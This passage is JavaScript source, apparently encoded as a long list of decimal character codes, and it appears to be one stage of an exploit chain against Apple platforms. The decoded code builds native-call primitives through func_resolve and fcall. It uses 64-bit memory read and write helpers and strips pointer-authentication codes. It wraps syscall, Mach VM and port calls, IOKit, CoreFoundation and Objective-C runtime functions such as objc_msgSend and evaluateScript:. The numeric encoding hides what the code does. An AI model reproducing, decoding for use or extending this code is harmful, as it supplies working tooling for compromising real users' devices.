89, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 78, 80, 82, 73, 78, 84, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 110, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 73, 78, 84, 70, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 10, 108, 101, 116, 32, 69, 82, 82, 78, 79, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 114, 114, 110, 111, 34, 41, 59, 10, 108, 101, 116, 32, 67, 76, 79, 83, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 69, 88, 73, 84, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 120, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 67, 72, 65, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 99, 104, 97, 114, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 80, 73, 68, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 112, 105, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 89, 83, 67, 65, 76, 76, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 121, 115, 99, 97, 108, 108, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 115, 115, 101, 114, 116, 40, 97, 44, 32, 98, 32, 61, 32, 34, 78, 47, 65, 34, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 33, 97, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 96, 97, 115, 115, 101, 114, 116, 32, 102, 97, 105, 108, 101, 100, 58, 32, 36, 123, 98, 125, 96, 41, 10, 32, 32, 32, 32, 125, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 69, 82, 82, 79, 82, 40, 97, 41, 32, 123, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 97, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 32, 61, 32, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 82, 69, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 117, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 85, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 109, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 77, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 110, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 78, 80, 82, 73, 78, 84, 70, 44, 32, 98, 117, 102, 44, 32, 115, 105, 122, 101, 44, 32, 102, 109, 116, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 73, 78, 84, 70, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 102, 109, 116, 41, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 108, 111, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 76, 79, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 120, 105, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 69, 88, 73, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 99, 104, 97, 114, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 67, 72, 65, 82, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 112, 105, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 80, 73, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 121, 115, 99, 97, 108, 108, 40, 110, 117, 109, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 89, 83, 67, 65, 76, 76, 44, 32, 110, 117, 109, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 40, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 117, 116, 115, 110, 97, 109, 101, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 50, 53, 54, 110, 44, 32, 53, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 102, 99, 97, 108, 108, 40, 85, 78, 65, 77, 69, 44, 32, 117, 116, 115, 110, 97, 109, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 117, 116, 115, 110, 97, 109, 101, 32, 43, 32, 40, 50, 53, 54, 110, 32, 42, 32, 52, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 59, 10, 125, 10, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 82, 69, 76, 69, 65, 83, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 82, 101, 108, 101, 97, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 72, 79, 87, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 104, 111, 119, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 48, 56, 48, 48, 48, 49, 48, 48, 110, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 99, 115, 116, 114, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 44, 32, 99, 115, 116, 114, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 58, 115, 101, 108, 101, 99, 116, 111, 114, 58, 111, 98, 106, 101, 99, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 32, 32, 